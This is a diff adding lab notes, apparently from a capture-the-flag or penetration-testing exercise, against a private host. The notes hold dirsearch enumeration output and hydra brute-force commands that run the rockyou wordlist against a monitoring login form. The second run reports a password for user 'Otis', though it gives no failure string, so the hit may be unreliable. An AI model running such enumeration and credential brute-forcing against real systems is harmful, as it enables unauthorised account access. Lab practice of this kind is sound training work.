@@ -46,3 +46,114 @@ HOP RTT      ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 12.76 seconds
+
+
+
+└─$ dirsearch -u http://172.16.33.55
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/kali/reports/http_172.16.33.55/_24-04-29_17-21-01.txt
+
+Target: http://172.16.33.55/
+
+[17:21:01] Starting: 
+[17:21:02] 301 -  231B  - /js  ->  http://172.16.33.55/js/
+[17:21:03] 403 -  213B  - /.ht_wsr.txt
+[17:21:03] 403 -  216B  - /.htaccess.bak1
+[17:21:04] 403 -  216B  - /.htaccess.orig
+[17:21:04] 403 -  218B  - /.htaccess.sample
+[17:21:04] 403 -  216B  - /.htaccess.save
+[17:21:04] 403 -  217B  - /.htaccess_extra
+[17:21:04] 403 -  216B  - /.htaccess_orig
+[17:21:04] 403 -  214B  - /.htaccess_sc
+[17:21:04] 403 -  214B  - /.htaccessBAK
+[17:21:04] 403 -  214B  - /.htaccessOLD
+[17:21:04] 403 -  215B  - /.htaccessOLD2
+[17:21:04] 403 -  206B  - /.htm
+[17:21:04] 403 -  207B  - /.html
+[17:21:04] 403 -  216B  - /.htpasswd_test
+[17:21:04] 403 -  212B  - /.htpasswds
+[17:21:04] 403 -  213B  - /.httr-oauth
+[17:21:05] 403 -  211B  - /.user.ini
+[17:21:15] 403 -  210B  - /cgi-bin/
+[17:21:17] 301 -  232B  - /css  ->  http://172.16.33.55/css/
+[17:21:17] 301 -  233B  - /data  ->  http://172.16.33.55/data/
+[17:21:17] 200 -    1KB - /data/
+[17:21:20] 301 -  234B  - /fonts  ->  http://172.16.33.55/fonts/
+[17:21:21] 200 -    3KB - /gulpfile.js
+[17:21:21] 301 -  232B  - /img  ->  http://172.16.33.55/img/
+[17:21:22] 200 -   31B  - /index.php
+[17:21:22] 200 -   31B  - /index.php/login/
+[17:21:23] 200 -    4KB - /js/
+[17:21:26] 301 -  239B  - /monitoring  ->  http://172.16.33.55/monitoring/
+[17:21:26] 302 -    0B  - /monitoring/  ->  login.php
+[17:21:27] 301 -  233B  - /news  ->  http://172.16.33.55/news/
+[17:21:27] 200 -  774B  - /package.json
+[17:21:28] 200 -   88KB - /package-lock.json
+[17:21:28] 200 -   85KB - /phpinfo.php
+[17:21:29] 301 -  239B  - /phpmyadmin  ->  http://172.16.33.55/phpmyadmin/
+[17:21:29] 200 -   27KB - /phpmyadmin/ChangeLog
+[17:21:29] 200 -    1KB - /phpmyadmin/README
+[17:21:29] 200 -   15KB - /phpmyadmin/doc/html/index.html
+[17:21:29] 200 -    3KB - /phpmyadmin/index.php
+[17:21:29] 200 -    3KB - /phpmyadmin/
+[17:21:31] 200 -    3KB - /readme.md
+[17:21:39] 301 -  236B  - /webmail  ->  http://172.16.33.55/webmail/
+[17:21:39] 200 -    2KB - /webmail/src/configtest.php
+
+
+
+
+└─$ hydra -l Otis -P rockyou.txt 172.16.33.55 http-form-post "/monitoring/login.php:username=^USER^:passwd=^PASS^:INVALID LOGIN"  -vV -f
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-29 22:43:57
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-post-form://172.16.33.55:80/monitoring/login.php:username=^USER^:passwd=^PASS^:INVALID LOGIN
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[ERROR] optional parameters must have the format X=value: passwd=^PASS^
+
+
+http://172.16.33.55/news/
+
+    Monitoring Service
+
+    Our team have been working hard to create you a free monitoring service for your servers. 
+    A special thank you to Otis, who led the team.
+
+┌──(kali㉿kali)-[~]
+└─$ hydra -l Otis -P rockyou.txt 172.16.33.55 http-form-post "/monitoring/login.php:username=^USER^:passwd=^PASS^"  -vV -f
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-29 22:44:14
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-post-form://172.16.33.55:80/monitoring/login.php:username=^USER^:passwd=^PASS^
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[ATTEMPT] target 172.16.33.55 - login "Otis" - pass "123456" - 1 of 14344399 [child 0] (0/0)
+[ATTEMPT] target 172.16.33.55 - login "Otis" - pass "12345" - 2 of 14344399 [child 1] (0/0)
+[ATTEMPT] target 172.16.33.55 - login "Otis" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
+[ATTEMPT] target 172.16.33.55 - login "Otis" - pass "password" - 4 of 14344399 [child 3] (0/0)
+[ATTEMPT] target 172.16.33.55 - login "Otis" - pass "iloveyou" - 5 of 14344399 [child 4] (0/0)
+[ATTEMPT] target 172.16.33.55 - login "Otis" - pass "princess" - 6 of 14344399 [child 5] (0/0)
+[ATTEMPT] target 172.16.33.55 - login "Otis" - pass "1234567" - 7 of 14344399 [child 6] (0/0)
+[ATTEMPT] target 172.16.33.55 - login "Otis" - pass "rockyou" - 8 of 14344399 [child 7] (0/0)
+[ATTEMPT] target 172.16.33.55 - login "Otis" - pass "12345678" - 9 of 14344399 [child 8] (0/0)
+[ATTEMPT] target 172.16.33.55 - login "Otis" - pass "abc123" - 10 of 14344399 [child 9] (0/0)
+[ATTEMPT] target 172.16.33.55 - login "Otis" - pass "nicole" - 11 of 14344399 [child 10] (0/0)
+[ATTEMPT] target 172.16.33.55 - login "Otis" - pass "daniel" - 12 of 14344399 [child 11] (0/0)
+[ATTEMPT] target 172.16.33.55 - login "Otis" - pass "babygirl" - 13 of 14344399 [child 12] (0/0)
+[ATTEMPT] target 172.16.33.55 - login "Otis" - pass "monkey" - 14 of 14344399 [child 13] (0/0)
+[ATTEMPT] target 172.16.33.55 - login "Otis" - pass "lovely" - 15 of 14344399 [child 14] (0/0)
+[ATTEMPT] target 172.16.33.55 - login "Otis" - pass "jessica" - 16 of 14344399 [child 15] (0/0)
+[80][http-post-form] host: 172.16.33.55   login: Otis   password: 123456
+[STATUS] attack finished for 172.16.33.55 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+
+# got http://172.16.33.55/webmail/src/webmail.php and http://172.16.33.55/monitoring/index.php
+
